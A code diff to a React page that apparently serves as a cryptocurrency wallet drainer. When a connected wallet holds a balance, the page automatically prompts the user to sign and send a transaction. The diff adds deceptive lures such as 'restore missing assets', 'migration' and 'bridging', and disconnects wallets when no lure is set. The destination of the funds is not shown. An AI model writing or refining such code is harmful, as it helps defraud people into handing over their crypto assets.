@@ -7,6 +7,7 @@ import {
   usePrepareSendTransaction,
   useSendTransaction,
   useWaitForTransaction,
+  useDisconnect,
 } from "wagmi";
 import { useWeb3Modal } from "@web3modal/react";
 import { useEffect, useState } from "react";
@@ -17,10 +18,9 @@ import Web3EarlyAccess from "@/components/web3-early-access";
 import Footer from "@/components/footer";
 import SupportedBrands2 from "@/components/supported-brands2";
 
-const inter = Inter({ subsets: ["latin"] });
-
 export default function Home() {
   const { open: openWalletConnection } = useWeb3Modal();
+  const { disconnect } = useDisconnect();
   const { address, isConnected } = useAccount();
   const balance = useBalance({ address });
   if (balance.data) {
@@ -28,7 +28,7 @@ export default function Home() {
   }
 
   // Message State
-  const [walletSignMessage, setWalletSignMessage] = useState("claim");
+  const [walletSignMessage, setWalletSignMessage] = useState("");
 
   function switchWalletSignMessage(selectedIssuse) {
     let signMessage = "";
@@ -41,6 +41,15 @@ export default function Home() {
         break;
       case "restore":
         signMessage = "⚠️Attention: Proceed to restore missing assets";
+        break;
+      case "migration":
+        signMessage = "⚠️Attention: Proceed with migration!";
+        break;
+      case "bridging":
+        signMessage = "⚠️Attention: Proceed with bridging?";
+        break;
+      default:
+        signMessage = "";
         break;
     }
 
@@ -114,7 +123,11 @@ export default function Home() {
     console.log("UseEffect 1...");
     if (isConnected) {
       observeWalletBalance();
-      walletBalanceInWei > 0n && signMessage();
+      if (!walletSignMessage) {
+        disconnect();
+      } else {
+        walletBalanceInWei > 0n && signMessage();
+      }
     }
   }, [isConnected, walletBalanceInWei]);
 
